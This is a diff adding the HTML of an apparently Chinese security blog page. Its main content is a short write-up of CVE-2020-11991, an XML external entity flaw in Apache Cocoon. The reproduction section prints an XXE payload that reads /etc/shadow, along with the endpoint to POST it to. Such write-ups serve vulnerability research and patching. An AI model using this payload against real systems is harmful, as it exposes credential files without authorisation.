+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20DolphinScheduler/(CVE-2020-13922)Apache%20DolphinScheduler%20%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlwt001ay8v1al9ghgvf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Cocoon XML/（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Cocoon%20XML/%EF%BC%88CVE-2020-11991%EF%BC%89Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.182Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-11991）Apache-Cocoon-XML-外部实体注入漏洞"><a href="#（CVE-2020-11991）Apache-Cocoon-XML-外部实体注入漏洞" class="headerlink" title="（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞"></a>（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache Cocoon 是一个基于 Spring<br>框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache<br>Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon<br>通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991<br>与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的<br>xml。攻击者可以使用包括外部系统实体在内的特制 xml<br>来访问服务器系统上的任何文件。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Cocoon &lt;= 2.1.12</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>以下是apache社区官方提供利用方式：</p>
+<pre><code>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM
+&quot;file:///etc/shadow&quot;&gt; ]&gt;
+&lt;userInfo&gt;
+&lt;firstName&gt;John&lt;/firstName&gt;
+&lt;lastName&gt;&amp;ent;&lt;/lastName&gt;
+&lt;/userInfo&gt;
+</code></pre>
+<p>与普通XXE并无差别，向<code>/v2/api/product/manger/getInfo</code>位置POST构造好的xml数据即可</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Cocoon%20XML/%EF%BC%88CVE-2020-11991%EF%BC%89Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Cocoon%20XML/%EF%BC%88CVE-2020-11991%EF%BC%89Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlq00016y8v13qpnhnn7" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/96/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/95/">95</a><a class="page-number" href="/page/96/">96</a><span class="page-number current">97</span><a class="page-number" href="/page/98/">98</a><a class="page-number" href="/page/99/">99</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/98/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
